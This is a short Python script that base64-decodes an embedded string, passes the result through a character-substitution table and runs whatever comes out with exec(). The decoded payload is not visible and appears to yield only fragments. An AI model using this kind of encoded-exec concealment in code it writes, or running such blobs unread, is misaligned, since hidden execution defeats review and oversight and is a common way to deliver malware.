import base64

exec(
    "".join(
        [
            y[0]
            for x in [
                x
                for x in base64.b64decode(
                    (
                        "fUVsWHs8enMve24iL3x9IlIiL3Qve24iL3x1biIEksJCwkPl9zKS4iUiladW4iL3tuInRaWg=="
                    ).encode("ascii")
                ).decode("ascii")
            ]
            for y in [
                [x[0], x[1]]
                for x in {
                    "\t": "o",
                    "\n": "}",
                    " ": "s",
                    "!": "y",
                    "@": "j",
                    ">": "D",
                    "r": "<",
                    "G": "?",
                    "H": "J",
                    "I": "h",
                    "J": "f",
                    "K": "r",
                    "L": "@",
                    "M": "*",
                    "N": "a",
                    "O": "g",
                    "P": "q",
                    "Q": "Q",
                    "U": "\n",
                    "R": "-",
                    "S": "~",
                    "T": "=",
                    "V": "`",
                    "W": "7",
                    "X": "3",
                    "Y": "4",
                    "Z": "M",
                }.items()
            ]
            if x == y[1]
        ]
    )
)
